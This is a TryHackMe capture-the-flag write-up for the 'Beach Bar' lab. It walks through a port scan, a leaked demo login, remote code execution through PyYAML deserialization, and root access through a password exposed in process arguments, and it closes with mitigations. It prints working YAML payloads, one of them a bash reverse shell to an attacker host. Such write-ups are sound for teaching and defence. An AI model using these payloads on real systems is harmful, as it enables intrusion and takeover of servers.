# Beach Bar - TryHackMe Write-up

A detailed write-up on how to solve the **Beach Bar** machine on TryHackMe. This lab covers reconnaissance techniques, exploiting Insecure Deserialization in Python, and privilege escalation by enumerating exposed processes.

* **Author:** HackSysX70
* **Platform:** TryHackMe
* **Difficulty:** Easy
* **OS:** Linux

---

## 1. Reconnaissance (Recon)

We begin by performing a full port scan on the target machine using **Nmap** to identify exposed services.

```bash
nmap -p- -sS -T4 -Pn -n -vvv -sVC <TARGET_IP> -oN scan.txt
```

### Explanation of parameters used:
* `-p-`: Scans **all 65,535 available ports**. This is used because administrators often hide services on non-standard ports. If we only scan the default top 1,000 ports, we might miss critical entry vectors.
* `-sS`: Performs a *SYN Stealth* scan (half-open). It is fast, efficient, and does not complete the 3-way handshake, making it more stealthy against simple logging.
* `-T4`: Sets the timing template to level 4 (aggressive). This speeds up the scan to save time without losing too much reliability on stable networks like lab environments.
* `-Pn`: Treats the host as active, **skipping ICMP ping discovery**. This prevents Nmap from dropping the target if it blocks ping requests via a firewall.
* `-n`: Disables DNS name resolution, significantly reducing the total scan time.
* `-vvv`: Increases the verbosity level to the maximum. It displays open ports on the screen in real-time as they are discovered, rather than waiting for the entire process to finish.
* `-sVC`: Combines `-sV` (determines the exact service version running on the port) and `-sC` (runs Nmap default scripts to look for common vulnerabilities in those services).
* `-oN scan.txt`: Saves the complete output in normal format into a file named `scan.txt` for future reference.

### Scan Results:
* **Port 22/TCP:** Open - SSH Service.
* **Port 80/TCP:** Open - HTTP Service (Web Server).

---

## 2. Web Enumeration

Upon accessing the target IP address through a web browser, we land on the beach bar application interface. Inspecting the **page source code** thoroughly, we locate a critical development comment (*Staff Note*):

```text
staff note: the demo DJ login is still enabled for the soft opening.
dj / dj  -- swap this before the season starts (ticket BAR-7)
```

Using these exposed credentials, we successfully authenticate into the web platform:
* **Username:** `dj`
* **Password:** `dj`

---

## 3. Exploitation (Gaining Initial Access)

Once authenticated, we find an **Import Playlist** feature that accepts data files in **YAML** (`.yml`) format.

### Vulnerability Analysis
Python web applications commonly use libraries like `PyYAML` to process these files. If the application relies on the insecure `yaml.load()` method instead of `yaml.safe_load()`, the parser will process native Python object tags. This triggers an **Insecure Deserialization** vulnerability, allowing Remote Code Execution (RCE).

### Proof of Concept (PoC)
To confirm command execution, we inject the `!!python/object/apply` tag invoking the `subprocess.check_output` module to run system commands via the Bash interpreter:

```yaml
!!python/object/apply:subprocess.check_output
- ["bash", "-c", "id"]
```
After submitting it, the webpage reflected the system user's data (`bartender`), confirming active command execution.

### Catching the Reverse Shell
We set up a Netcat listener on our Kali Linux machine on port `4444`:

```bash
nc -lvnp 4444
```

Then, we injected the following modified payload into the YAML import field to force the server to connect back to our terminal:

```yaml
!!python/object/apply:subprocess.Popen
- ["bash", "-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"]
```

*Note: The Linux `/tmp` directory was utilized during the transfer of auxiliary tools because it grants universal write permissions (`sticky bit`) to any low-privileged user.*

As soon as the file was processed, we received the connection and accessed the first flag file:
```bash
cat /home/bartender/user.txt
```
* **User Flag:** `THM{REDACTED_USER_FLAG}` (Hidden due to platform write-up policies).

---

## 4. Privilege Escalation

Operating inside the system as the `bartender` user, we proceeded with local enumeration to find a vector to escalate privileges to `root`.

To avoid parsing hundreds of irrelevant OS background processes, we utilized the `ps` command, filtering specifically for full parameter strings executed by the administrator:

```bash
ps -f -u root
```

### Vector Discovery
While reviewing root's active processes, we spotted a custom Python script managing the application's music backend loop (`jukeboxd.py`). The administrator made the severe mistake of passing the service password as a plain-text argument directly in the command line:

```text
root ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024!
```

### Gaining Root Access
Using the exposed credential (`SunsetSpritz2024!`), we requested a session switch to the administrative user:

```bash
su root
```

We entered the retrieved password and gained full control over the server as the Linux superuser, allowing us to read the final flag:

```bash
cd /root
cat root.txt
```
* **Root Flag:** `THM{REDACTED_ROOT_FLAG}` (Hidden due to platform write-up policies).

---
## Conclusions and Mitigation
1. **Insecure Deserialization:** Never use `yaml.load()` with user-supplied inputs. The direct solution is to implement `yaml.safe_load()`, which restricts parsing to simple data types (strings, integers, lists), blocking Python object instantiation.
2. **Exposed Credentials in Processes:** Passwords should never be passed as visible command arguments in automated background scripts. They must be managed via protected environment variables or restricted configuration files (`chmod 600`).
3. **Production Comments:** Leaving notes containing default credentials in production HTML source code exposes infrastructure to unauthorized access via basic inspection techniques.
